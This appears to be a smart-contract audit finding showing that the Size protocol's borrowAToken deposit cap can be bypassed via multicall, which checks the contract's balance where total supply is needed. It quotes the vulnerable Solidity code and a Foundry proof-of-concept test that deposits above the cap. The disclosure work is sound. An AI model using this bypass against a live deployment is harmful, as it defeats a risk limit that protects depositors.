# Vulnerability details

## Impact
There is a limit on the amount of `borrowAToken` that users can `deposit`. 
The check works correctly when users try to `deposit` directly. 
However, this check can be `bypassed` when users `deposit` using `multicall`. 
In other words, the `borrowAToken cap check` is useless.

## Proof of Concept
When users try to `deposit` directly using the `deposit` function, the `validateBorrowATokenCap` function is called.
```
function executeDeposit(State storage state, DepositParams calldata params) public {
    if (params.token == address(state.data.underlyingBorrowToken)) {
        state.depositUnderlyingBorrowTokenToVariablePool(from, params.to, amount);
        if (!state.data.isMulticall) {
            state.validateBorrowATokenCap();  // @audit, here
        }
    } else {
        state.depositUnderlyingCollateralToken(from, params.to, amount);
    }
}
```
In this function, we check whether the `total supply` of `borrowAToken` will exceed the `specified cap`. 
```
function validateBorrowATokenCap(State storage state) external view {
    if (state.data.borrowAToken.totalSupply() > state.riskConfig.borrowATokenCap) {
        revert Errors.BORROW_ATOKEN_CAP_EXCEEDED(
            state.riskConfig.borrowATokenCap, state.data.borrowAToken.totalSupply()
        );
    }
}
```
However, in the `multicall`, we used the `balance of Size contract` instead of the `total supply` in the check. 
```
function multicall(State storage state, bytes[] calldata data) internal returns (bytes[] memory results) {
    state.data.isMulticall = true;
    uint256 borrowATokenSupplyBefore = state.data.borrowAToken.balanceOf(address(this));  // @audit, here
    uint256 debtTokenSupplyBefore = state.data.debtToken.totalSupply();
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
        results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
    uint256 borrowATokenSupplyAfter = state.data.borrowAToken.balanceOf(address(this)); // @audit, here
    uint256 debtTokenSupplyAfter = state.data.debtToken.totalSupply();
    state.validateBorrowATokenIncreaseLteDebtTokenDecrease(
        borrowATokenSupplyBefore, debtTokenSupplyBefore, borrowATokenSupplyAfter, debtTokenSupplyAfter
    );
    state.data.isMulticall = false;
}
```
Clearly, the `balance of Size` is not the same as the `total supply`. 
When users `deposit` `borrowAToken`, the `total supply` increases, but the `balance of Size` remains unchanged. 
As a result, the `cap check` will always be `bypassed`. 
This means users can `deposit` any amount of `borrowAToken` they want, despite the `cap check`.

Please add below test to the `test/local/actions/Multicall.t`:
```
function test_Multicall_can_deposit_above_cap() public {
    NonTransferrableScaledToken borrowAToken = size.data().borrowAToken;
    uint256 cap = 1000e6;
    _updateConfig("borrowATokenCap", cap);

    _deposit(alice, usdc, cap);

    uint256 amount = 100;
    _mint(address(usdc), alice, amount);
    _approve(alice, address(usdc), address(size), amount);

    // The deposit cannot be made directly because it will exceed the total supply cap
    vm.expectRevert(abi.encodeWithSelector(Errors.BORROW_ATOKEN_CAP_EXCEEDED.selector, cap, cap + amount));
    vm.prank(alice);
    size.deposit(DepositParams({token: address(usdc), amount: amount, to: alice}));

    bytes[] memory data = new bytes[](1);
    data[0] = abi.encodeCall(size.deposit, DepositParams({token: address(usdc), amount: amount, to: alice}));
    vm.prank(alice);
    // We can make deposits using multicall
    size.multicall(data);

    // The total supply has finally exceeded the cap
    assertEq(borrowAToken.totalSupply(), cap + amount); 
}
```
